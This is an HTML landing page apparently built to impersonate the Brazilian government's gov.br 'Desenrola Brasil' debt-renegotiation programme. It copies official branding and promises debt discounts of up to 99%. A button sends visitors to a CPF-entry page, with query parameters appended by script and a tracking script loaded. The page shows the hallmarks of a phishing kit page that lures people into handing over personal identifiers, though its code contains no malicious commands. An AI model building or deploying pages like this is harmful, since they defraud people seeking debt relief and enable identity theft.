<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/png" sizes="96x96" href="icons8-brasil-windows-11-color-96.png">
  <link rel="icon" type="image/png" sizes="32x32" href="icons8-brasil-windows-11-color-32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="icons8-brasil-windows-11-color-16.png">
  <title>Desenrola Brasil — gov.br</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="assets/css/desenrola.css?v=20261010-3">
  <script src="assets/js/tracking.js"></script>
  <style>
    .hero-banner {
      width: 100%;
      background: #0c326f;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }
    .hero-img {
      width: 100%;
      height: auto;
      max-height: 340px;
      object-fit: contain;
      display: block;
    }
    .card-main.landing {
      background: #fff;
      margin: 14px 16px 20px;
      padding: 28px 20px 44px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
      text-align: center;
    }
    .stack-logo {
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .stack-logo .ico {
      max-height: 58px;
      width: auto;
      display: block;
    }
    .stack-logo .titulo-img {
      max-width: 220px;
      width: 100%;
      height: auto;
      margin-top: 6px;
      display: block;
    }
    .headline {
      font-size: 17px;
      font-weight: 700;
      color: #1451b4;
      line-height: 1.42;
      margin-top: 18px;
      max-width: 340px;
      margin-left: auto;
      margin-right: auto;
    }
    .subline {
      font-size: 15px;
      font-weight: 400;
      color: #333333;
      margin-top: 16px;
      line-height: 1.45;
      max-width: 320px;
      margin-left: auto;
      margin-right: auto;
    }
    .btn-primary.btn-cta-pill {
      display: inline-block;
      width: auto;
      min-width: 220px;
      max-width: min(90vw, 300px);
      margin: 24px auto 0;
      padding: 15px 44px;
      background: #1451b4;
      color: #ffffff !important;
      border: none;
      border-radius: 999px;
      font-size: 15px;
      font-weight: 700;
      font-family: inherit;
      text-transform: uppercase;
      letter-spacing: 0.04em;
      cursor: pointer;
      text-align: center;
      text-decoration: none;
      box-shadow: 0 4px 14px rgba(20, 81, 180, 0.3);
      transition: transform 0.15s ease, filter 0.15s ease;
    }
    .btn-primary.btn-cta-pill:hover {
      filter: brightness(1.08);
      transform: translateY(-1px);
    }
  </style>
</head>
<body>
  <div class="page-wrap">
    <header class="hdr">
      <a href="index.html" class="hdr-logo-link" aria-label="gov.br">
        <img src="assets/img/iconegov.png" alt="gov.br" class="hdr-logo-img" width="100" height="32">
      </a>
      <div class="hdr-right">
        <button type="button" class="hdr-icon-btn" id="hdrMenu" aria-label="Abrir menu" aria-expanded="false">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.35" stroke-linecap="round" aria-hidden="true">
            <line x1="4" y1="7" x2="20" y2="7"></line>
            <line x1="4" y1="12" x2="20" y2="12"></line>
            <line x1="4" y1="17" x2="20" y2="17"></line>
          </svg>
        </button>
        <span class="hdr-vsep" aria-hidden="true"></span>
        <button type="button" class="hdr-icon-btn hdr-icon-btn--contrast" id="hdrContrast" aria-label="Alto contraste" title="Contraste">
          <svg class="hdr-ico-split-contrast" width="22" height="22" viewBox="0 0 24 24" aria-hidden="true">
            <circle cx="12" cy="12" r="9.25" fill="none" stroke="#1451B4" stroke-width="1.15"></circle>
            <path fill="#1451B4" d="M12 2.75 A9.25 9.25 0 0 0 12 21.25 z"></path>
            <path fill="#ffffff" d="M12 2.75 A9.25 9.25 0 0 1 12 21.25 z"></path>
          </svg>
        </button>
        <button type="button" class="btn-entrar" aria-label="Entrar">
          <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
            <path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
          </svg>
          Entrar
        </button>
      </div>
    </header>

    <div class="crumb">
      Benefício <span aria-hidden="true"> &gt; </span> Desenrola Brasil
    </div>

    <!-- Hero Banner Profissional -->
    <div class="hero-banner">
      <img class="hero-img" src="assets/img/banner_desenrola.jpg" alt="Desenrola Brasil" width="720" height="405">
    </div>

    <!-- Card Principal -->
    <section class="card-main landing">
      <div class="stack-logo stack-logo-single">
        <img class="ico" src="assets/img/logoamarelo.png" alt="">
        <img class="titulo-img" src="assets/img/desenrola.png" alt="Desenrola Brasil">
      </div>

      <p class="headline">
        O Programa Desenrola Brasil<br>
        possibilita a renegociação de dívidas<br>
        com descontos de até 99%
      </p>
      <p class="subline">
        Clique no botão abaixo para<br>
        acessar a plataforma
      </p>

      <a id="btnAcessar" class="btn-primary btn-cta-pill" href="cpf/index.html">Acessar agora</a>
    </section>

    <!-- Rodapé Oficial gov.br -->
    <footer class="site-ft">
      <div class="site-ft-inner">
        <img src="assets/img/iconefooter.png" alt="gov.br" class="ft-gov-img" width="120" height="40">
        <div class="copy-block">
          <p>Todo o conteúdo deste site está publicado sob a licença</p>
          <strong>Sistema de Renegociação — Todos os direitos reservados</strong>
        </div>
      </div>
    </footer>
  </div>

  <script src="assets/js/header.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', function () {
      var a = document.getElementById('btnAcessar');
      if (!a || typeof window.gvdesenrolaAppendQuery !== 'function') return;
      a.href = window.gvdesenrolaAppendQuery(a.getAttribute('href'));
    });
  </script>
</body>
</html>
